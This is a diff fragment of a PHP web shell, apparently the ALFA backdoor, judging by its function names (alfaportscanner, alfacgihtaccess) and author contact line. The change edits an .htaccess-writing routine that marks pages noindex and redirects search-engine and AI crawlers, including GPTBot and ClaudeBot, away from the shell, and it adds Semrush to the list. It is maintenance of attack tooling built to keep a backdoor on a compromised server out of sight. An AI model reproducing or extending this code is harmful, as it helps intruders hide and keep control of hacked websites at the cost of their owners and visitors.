@@ -5690,7 +5690,7 @@ function alfaportscanner() {
 }
 function alfacgihtaccess($m, $d = '', $symname = false) {
   $readme = "";
-	$bot="\n<IfModule mod_headers.c>\nHeader set X-Robots-Tag \"noindex, nofollow\"\n</IfModule>\n<IfModule mod_rewrite.c>\nRewriteEngine On\nRewriteCond %{HTTP_USER_AGENT} (Googlebot|bingbot|Slurp|Baiduspider|YandexBot||AhrefsBot|MJ12Bot|facebookexternalhit|Twitterbot|LinkedInBot|Slackbot|GPTBot|ChatGPT-User|OAI-SearchBot|ClaudeBot|anthropic-ai|PerplexityBot|spider|bot) [NC]\nRewriteRule (.*) http://google.com [NC,L,R=301]\n</IfModule>\n";
+	$bot="\n<IfModule mod_headers.c>\n\tHeader set X-Robots-Tag \"noindex, nofollow\"\n</IfModule>\n<IfModule mod_rewrite.c>\n\tRewriteEngine On\n\tRewriteCond %{HTTP_USER_AGENT} (Googlebot|bingbot|Slurp|Baiduspider|YandexBot|Semrush|AhrefsBot|MJ12Bot|facebookexternalhit|Twitterbot|LinkedInBot|Slackbot|GPTBot|ChatGPT-User|OAI-SearchBot|ClaudeBot|anthropic-ai|PerplexityBot|spider|bot) [NC]\n\tRewriteRule (.*) http://google.com [NC,L,R=301]\n</IfModule>\n";
   if ($symname) {
     $readme = "\nReadmeName ".trim($symname);
   }
@@ -7103,4 +7103,5 @@ exit;
 #skype : ehsan.invisible
 */
 ?>
+
 
